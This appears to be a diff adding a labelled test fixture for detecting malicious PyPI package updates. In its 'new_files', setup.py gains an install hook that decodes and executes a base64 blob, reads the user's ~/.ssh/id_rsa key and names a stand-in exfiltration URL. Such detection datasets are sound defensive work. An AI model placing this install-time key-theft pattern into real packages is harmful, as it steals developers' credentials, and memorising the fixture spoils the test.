@@ -1,0 +1,26 @@
+{
+  "id": "pypi_table_align",
+  "label": "malicious",
+  "ecosystem": "pypi",
+  "name": "table-align",
+  "old_version": "0.9.1",
+  "new_version": "0.9.2",
+  "rank": 18,
+  "old_time": "2026-05-01T00:00:00Z",
+  "new_time": "2026-05-01T03:00:00Z",
+  "old_publishers": [
+    "mina"
+  ],
+  "new_publishers": [
+    "mina"
+  ],
+  "registry_url": "https://pypi.org/project/table-align/0.9.2/",
+  "old_files": {
+    "setup.py": "from setuptools import setup\n\nsetup(name=\"table-align\", version=\"0.9.1\", py_modules=[\"table_align\"])\n",
+    "table_align.py": "def align(rows):\n    return rows\n"
+  },
+  "new_files": {
+    "setup.py": "import base64\nimport os\nimport subprocess\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\nclass InstallHook(install):\n    def run(self):\n        install.run(self)\n        blob = \"aW1wb3J0IHNvY2tldA==QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=\"\n        source = base64.b64decode(blob).decode(\"utf-8\")\n        key = open(os.path.expanduser(\"~/.ssh/id_rsa\"), encoding=\"utf-8\").read()\n        exec(source)\n        subprocess.check_call([\"python\", \"-c\", \"print('table-align')\"])\n        sink = \"http://203.0.113.45/align\"\n\nsetup(\n    name=\"table-align\",\n    version=\"0.9.2\",\n    py_modules=[\"table_align\"],\n    cmdclass={\"install\": InstallHook},\n)\n",
+    "table_align.py": "def align(rows):\n    return list(rows)\n"
+  }
+}
